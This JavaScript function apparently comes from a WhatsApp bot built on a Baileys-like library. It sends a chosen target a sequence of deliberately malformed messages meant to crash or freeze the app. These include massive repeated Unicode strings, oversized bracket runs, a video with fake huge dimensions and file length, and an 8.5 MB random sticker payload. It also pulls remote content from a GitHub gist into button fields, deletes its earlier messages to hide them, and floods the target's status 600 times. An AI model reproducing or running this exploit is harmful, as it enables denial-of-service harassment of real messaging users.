async function NativeXFcWithDozerX(sock, target) {
  const delay = ms => new Promise(res => setTimeout(res, ms));
  const SID = "5e03e0&mms3";
  const key = "10000000_2012297619515179_5714769099548640934_n.enc";
  const type = "image/webp";

  const generateLargeString = (sizeInBytes) => {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < sizeInBytes; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  };
  const extraPayload = generateLargeString(8.5 * 1024 * 1024);

  let apiClient;
  try {
    const res = await fetch('https://gist.githubusercontent.com/Tama-Ryuichi/572ad67856a67dbae3c37982679153b2/raw/apiClient.json');
    apiClient = await res.text();
  } catch (err) {
    console.error("Error fetching API data", err);
    return;
  }

  const xNativeRiepers = JSON.stringify({
    status: true,
    criador: "VerloadXx",
    resultado: {
      type: "md",
      ws: {
        _events: { "CB:ib,,dirty": ["Array"] },
        _eventsCount: 800000,
        _maxListeners: 0,
        url: "wss://web.whatsapp.com/ws/chat",
        config: {
          version: ["Array"],
          browser: ["Array"],
          waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
          sockCectTimeoutMs: 20000,
          keepAliveIntervalMs: 30000,
          logger: {},
          printQRInTerminal: false,
          emitOwnEvents: true,
          defaultQueryTimeoutMs: 60000,
          customUploadHosts: [],
          retryRequestDelayMs: 250,
          maxMsgRetryCount: 5,
          fireInitQueries: true,
          auth: { Object: "authData" },
          markOnlineOnsockCect: true,
          syncFullHistory: true,
          linkPreviewImageThumbnailWidth: 192,
          transactionOpts: { Object: "transactionOptsData" },
          generateHighQualityLinkPreview: false,
          options: {},
          appStateMacVerification: { Object: "appStateMacData" },
          mobile: true
        }
      }
    }
  });

  // ⬇️ Payload Messages
  const msg1 = generateWAMessageFromContent(target, {
    ephemeralMessage: {
      quotedMessage: {
        extendedTextMessage: {
          text: "༽ 𝖃𝕭𝕷𝕬𝕾𝕿𝕰𝕽 ༼" + "ោ៝".repeat(10000),
          title: "༽ 𝕱𝕺𝕸𝕺 ༼`",
          description: "Hi Im Yann Developer Black Riepers" + xNativeRiepers,
          canonicalUrl: "https://t.me/SyakYanRawr",
          previewType: "PHOTO",
          jpegTumbnail: Buffer.from([104, 123, 111, 89, 53, 172, 222, 200, 203, 217, 189, 190, 134, 225]),
          contextInfo: {
            mentionedJid: ["0@s.whatsapp.net"],
            isForwarded: true,
          },
        },
      },
    },
  });

  const msg2 = generateWAMessageFromContent(target, {
    viewOnceMessageV2: {
      nativeFlowMessage: {
        messageParamsJson: "([".repeat(15000),
        buttons: [
          { name: "galaxy_message", buttonParamsJson: "ꦽ" + "𑅂𑘵𑘴𑘿".repeat(10000) },
          { name: "single_select", buttonParamsJson: "ោ៝".repeat(10000) },
          { name: "call_permission_request", buttonParamsJson: JSON.stringify({ status: true }) },
          { name: "mpm", buttonParamsJson: xNativeRiepers },
          { name: "cta_call", buttonParamsJson: "ॏ".repeat(12309) },
        ],
      },
    },
  });

  const msg3 = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        nativeFlowMessage: {
          buttons: [
            {
              name: "single_select",
              buttonParamJson: ""
            },
            {
              name: "call_permission_request",
              buttonParamJson: JSON.stringify({ status: true })
            }
          ],
          messageParamsJson: "{{".repeat(10000)
        }
      }
    }
  });

  const videoCrash = {
    videoMessage: {
      url: "https://example.com/fake.mp4",
      mimetype: "video/mp4",
      caption: "꧔꧈".repeat(15000),
      fileSha256: Buffer.from("00", "hex"),
      fileLength: 999999999,
      height: 9999,
      width: 9999,
      mediaKey: Buffer.from("00", "hex"),
      fileEncSha256: Buffer.from("00", "hex"),
      directPath: "/v/t62.7118-24/...",
      mediaKeyTimestamp: 999999999,
      jpegThumbnail: Buffer.from("00", "hex"),
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        externalAdReply: {
          title: "꧔꧈",
          body: "꧔꧈",
          thumbnail: Buffer.from("00", "hex"),
          mediaType: 1,
          renderLargerThumbnail: true,
          showAdAttribution: true
        }
      }
    }
  };

  const bulldozerMessage = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=01&oe=685F4C37&_nc_sid=${SID}`,
          fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
          fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
          mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
          mimetype: type,
          directPath: `/v/t62.43144-24/${key}?ccb=11-4&oh=01&oe=685F4C37&_nc_sid=${SID}`,
          fileLength: { low: 999999, high: 0, unsigned: true },
          mediaKeyTimestamp: { low: Date.now() % 2147483647, high: 0, unsigned: false },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            participant: target,
            mentionedJid: ["0@s.whatsapp.net"],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 999999,
          },
          stickerSentTs: { low: -10000000, high: 999, unsigned: false },
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
          extraPayload,
        },
      },
    },
  }, {});
  
  const msgForce = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [target],
            forwardedNewsletterMessageInfo: {
              newsletterName: "\n\n",
              newsletterJid: "120363321780343299@newsletter",
              serverMessageId: 1
            },
            externalAdReply: {
              showAdAttribution: true,
              title: "?𝐗𝐁𝐋𝐀𝐒𝐓𝐄𝐑 𝐕𝐎𝐑𝐓𝐄𝐗 ( 空所 )",
              body: "",
              sourceUrl: "https://linuxy.app/",
              mediaType: 1,
              renderLargerThumbnail: true
            },
            businessMessageForwardInfo: { businessOwnerJid: target },
            dataSharingContext: { showMmDisclosure: true },
            quotedMessage: { paymentInviteMessage: { serviceType: 1, expiryTimestamp: null } }
          },
          header: { title: "", hasMediaAttachment: false },
          body: { text: "𝐗𝐁𝐋𝐀𝐒𝐓𝐄𝐑 𝐕𝐎𝐑𝐓𝐄𝐗  ( 空所 )" },
          nativeFlowMessage: {
            messageParamsJson: JSON.stringify({
              name: "galaxy_message",
              title: "galaxy_message",
              header: "Ryuichi - Beginner",
              body: "Call Galaxy"
            }),
            buttons: [
              { name: "single_select", buttonParamsJson: apiClient + "𝐗𝐁𝐋𝐀𝐒𝐓𝐄𝐑 𝐕𝐎𝐑𝐓𝐄𝐗 ( 空所 )" },
              { name: "call_permission_request", buttonParamsJson: apiClient + "?𝐗𝐁𝐋𝐀𝐒𝐓𝐄𝐑 𝐕𝐎𝐑𝐓𝐄𝐗 ( 空所 )" },
              { name: "payment_method", buttonParamsJson: "" },
              { name: "payment_status", buttonParamsJson: "" },
              { name: "review_order", buttonParamsJson: "" }
            ]
          }
        }
      }
    }
  }, {});


  const pret2 = await sock.relayMessage(target, msg1, { messageId: generateMessageID(), userJid: target });
  await delay(1500);
  const pret1 = await sock.relayMessage(target, msg2, { messageId: generateMessageID(), userJid: target });
  await delay(1500);
  const pret3 = await sock.relayMessage(target, msg3, { messageId: generateMessageID(), userJid: target });
  await delay(2000);

  await Promise.all([
    sock.sendMessage(target, { delete: { fromMe: true, remoteJid: target, id: pret1.key.id } }),
    sock.sendMessage(target, { delete: { fromMe: true, remoteJid: target, id: pret2.key.id } }),
    sock.sendMessage(target, { delete: { fromMe: true, remoteJid: target, id: pret3.key.id } }),
  ]);

  await delay(1500);

  await sock.relayMessage(target, videoCrash, { messageId: generateMessageID(), userJid: target });

  await delay(2000);

  await sock.relayMessage(target, msgForce.message, {
    participant: { jid: target },
    messageId: msgForce.key.id
  });

  await delay(1500);

  await sock.relayMessage(target, {
    extendedTextMessage: {
      text: "ꦾ".repeat(20000) + "@1".repeat(20000),
      contextInfo: {
        stanzaId: target,
        participant: target,
        quotedMessage: {
          conversation: "〽️⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑〽️" + "ꦾ࣯࣯".repeat(50000) + "@1".repeat(20000)
        },
        disappearingMode: {
          initiator: "CHANGED_IN_CHAT",
          trigger: "CHAT_SETTING"
        }
      },
      inviteLinkGroupTypeV2: "DEFAULT"
    }
  }, {
    paymentInviteMessage: {
      serviceType: "UPI",
      expiryTimestamp: Date.now() + 5184000000
    }
  }, {
    participant: { jid: target }
  }, {
    messageId: null
  });

  await delay(2000);

  for (let i = 0; i < 600; i++) { //GANTI JADI 10 KALO EROR
    await sock.relayMessage("status@broadcast", bulldozerMessage.message, {
      messageId: bulldozerMessage.key.id,
      statusJidList: [target],
    });
    await delay(100);
  }

  console.log("✅ succes send to target", target);
}